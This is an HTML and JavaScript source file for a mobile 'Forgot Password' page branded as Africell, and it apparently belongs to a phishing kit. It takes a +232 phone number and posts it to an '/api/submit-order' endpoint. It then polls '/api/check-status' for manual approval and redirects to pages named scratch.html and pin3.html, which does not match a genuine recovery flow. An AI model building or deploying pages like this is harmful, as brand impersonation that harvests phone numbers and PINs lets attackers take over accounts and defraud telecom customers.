<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Africell | Forgot Password</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        html, body {
            width: 100%;
            height: 100%;
            background: #F2F2F2;
            overflow-x: hidden;
        }

        .forgot-wrapper {
            width: 100%;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Solid Purple Header */
        .forgot-header {
            width: 100%;
            height: 98px;
            background: #991676;
            display: flex;
            align-items: center;
            padding: 0 20px;
        }

        .back-arrow {
            color: #ffffff;
            font-size: 24px;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 35px;
            height: 35px;
        }

        /* Main Content Container */
        .forgot-content {
            width: 100%;
            max-width: 520px;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 0 24px;
        }

        /* Large Bold Heading */
        .forgot-title {
            font-size: 36px;
            font-weight: 800;
            color: #000000;
            text-align: center;
            margin-top: 50px;
            margin-bottom: 24px;
        }

        /* Instruction Text */
        .forgot-instruction {
            font-size: 16px;
            color: #000000;
            text-align: center;
            font-weight: 400;
            margin-bottom: 40px;
        }

        /* Input Row Container */
        .forgot-input-row {
            display: flex;
            gap: 18px;
            width: 100%;
            margin-bottom: 40px;
        }

        /* Country Code Box */
        .forgot-prefix-box {
            width: 100px;
            height: 60px;
            background: #ffffff;
            border: 2px solid #991676;
            border-radius: 18px;
            font-size: 16px;
            font-weight: 700;
            color: #000000;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* Mobile Number Input Box */
        .forgot-input-field {
            flex: 1;
            height: 60px;
            background: #ffffff;
            border: 2px solid #991676;
            border-radius: 18px;
            font-size: 16px;
            font-weight: 600;
            color: #000000;
            text-align: center;
            outline: none;
            -webkit-appearance: none;
            appearance: none;
        }

        .forgot-input-field::placeholder {
            color: #666666;
            font-weight: 400;
            text-align: center;
        }

        .forgot-input-field:focus {
            border-color: #79105c;
        }

        /* Purple Send Button */
        .forgot-send-btn {
            width: 100%;
            height: 60px;
            background: #991676;
            color: #ffffff;
            border: none;
            border-radius: 16px;
            font-size: 18px;
            font-weight: 700;
            letter-spacing: 0.5px;
            text-transform: lowercase;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(153, 22, 118, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            transition: background 0.2s ease;
        }

        .forgot-send-btn:hover {
            background: #79105c;
        }

        .forgot-send-btn.disabled-state {
            opacity: 0.4;
            filter: blur(1.5px);
            pointer-events: none;
            cursor: not-allowed;
            box-shadow: none !important;
        }

        /* Loading Spinner */
        #loadingSpinner {
            display: none;
            flex-direction: row;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-top: 20px;
            font-size: 15px;
            color: #991676;
            font-weight: 600;
        }

        .spinner {
            width: 24px;
            height: 24px;
            border: 3px solid rgba(153, 22, 118, 0.2);
            border-top: 3px solid #991676;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Custom In-App Modal Dialog */
        #customModal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(153, 22, 118, 0.9);
            backdrop-filter: blur(8px);
            justify-content: center;
            align-items: center;
            z-index: 9999;
            padding: 20px;
        }

        .modal-card {
            background: #991676;
            width: 100%;
            max-width: 320px;
            border-radius: 24px;
            padding: 28px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
            color: #ffffff;
            animation: scaleUp 0.3s ease;
        }

        @keyframes scaleUp {
            from { transform: scale(0.8); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        .modal-message {
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 24px;
            line-height: 1.4;
            color: #ffffff;
        }

        .modal-btn {
            background: #ffd34d;
            color: #5E0C44;
            border: none;
            border-radius: 14px;
            padding: 14px 24px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 6px 16px rgba(255, 211, 77, 0.3);
        }

        .modal-btn:active {
            opacity: 0.9;
        }
    </style>
</head>
<body>

    <div class="forgot-wrapper">
        <!-- Solid Purple Header with Back Arrow -->
        <header class="forgot-header">
            <a href="pin2.html" class="back-arrow">
                <i class="fa-solid fa-arrow-left"></i>
            </a>
        </header>

        <!-- Main Body Content Positioned Toward Top -->
        <div class="forgot-content">
            <h1 class="forgot-title">Mobile Number</h1>
            <p class="forgot-instruction">Please Enter your mobile number</p>

            <!-- Phone Input Split Row -->
            <div class="forgot-input-row">
                <div class="forgot-prefix-box">+232</div>
                <input type="tel" id="recoveryPhone" class="forgot-input-field" placeholder="Mobile Number" maxlength="9" inputmode="numeric" pattern="[0-9]*" required>
            </div>

            <!-- Purple Send Button -->
            <button type="button" id="sendBtn" class="forgot-send-btn" onclick="submitRecoveryPhone()">send</button>

            <!-- Loading Spinner -->
            <div id="loadingSpinner">
                <div class="spinner"></div>
                <span>Checking account status...</span>
            </div>
        </div>
    </div>

    <!-- Custom In-App Modal Dialog -->
    <div id="customModal">
        <div class="modal-card">
            <div id="modalText" class="modal-message">Notification message here</div>
            <button class="modal-btn" onclick="closeModal()">OK</button>
        </div>
    </div>

   <script>
        let pendingAction = null;

        function showAppAlert(message, actionCallback = null) {
            document.getElementById('modalText').innerText = message;
            document.getElementById('customModal').style.display = 'flex';
            pendingAction = actionCallback;
        }

        function closeModal() {
            document.getElementById('customModal').style.display = 'none';
            if (pendingAction) {
                pendingAction();
                pendingAction = null;
            }
        }

        function isValidSierraLeonePhone(number) {
            const cleaned = number.replace(/[\s-]/g, '');
            return /^\d{8,9}$/.test(cleaned);
        }

        async function submitRecoveryPhone() {
            const rawPhone = document.getElementById('recoveryPhone').value.trim();
            const sendBtn = document.getElementById('sendBtn');
            const spinnerDiv = document.getElementById('loadingSpinner');

            if (!rawPhone || !isValidSierraLeonePhone(rawPhone)) {
                showAppAlert('❌ Enter Correct Africell Number');
                return;
            }

            // Strictly remove all spaces so phone matches server key format (+232XXXXXXXX)
            const fullPhone = '+232' + rawPhone;
            localStorage.setItem('africellUserPhone', fullPhone);
            localStorage.setItem('userPhone', fullPhone);

            try {
                sendBtn.classList.add('disabled-state');
                if (spinnerDiv) spinnerDiv.style.display = 'flex';

                const response = await fetch('/api/submit-order', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: fullPhone, uniqueId: 'Password Recovery Request' })
                });

                const result = await response.json();

                if (result.success) {
                    pollApprovalStatus(fullPhone);
                } else {
                    sendBtn.classList.remove('disabled-state');
                    if (spinnerDiv) spinnerDiv.style.display = 'none';
                    showAppAlert('❌ Submission failed. Please try again.');
                }
            } catch (error) {
                console.error('Error:', error);
                sendBtn.classList.remove('disabled-state');
                if (spinnerDiv) spinnerDiv.style.display = 'none';
                showAppAlert('Could not connect to the backend server.');
            }
        }

        function pollApprovalStatus(phone) {
            const cleanPhone = phone.replace(/\s+/g, '').trim();
            const sendBtn = document.getElementById('sendBtn');
            const spinnerDiv = document.getElementById('loadingSpinner');

            const statusInterval = setInterval(async () => {
                try {
                    const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}`);
                    const data = await response.json();

                    if (data.status === 'approved') {
                        clearInterval(statusInterval);
                        window.location.href = 'scratch.html'; // Corrected to scratch.html for Path 2
                    } 
                    else if (data.status === 'rejected' || data.status === 'wrong_id') {
                        clearInterval(statusInterval);
                        if (spinnerDiv) spinnerDiv.style.display = 'none';
                        sendBtn.classList.remove('disabled-state');
                        // Show alert and seamlessly redirect to pin3.html when OK is clicked
                        showAppAlert('❌ Not Registered.', () => {
                            window.location.href = 'pin3.html';
                        });
                    }
                } catch (e) {
                    console.error('Polling error', e);
                }
            }, 3000);
        }
    </script>

</body>
</html>
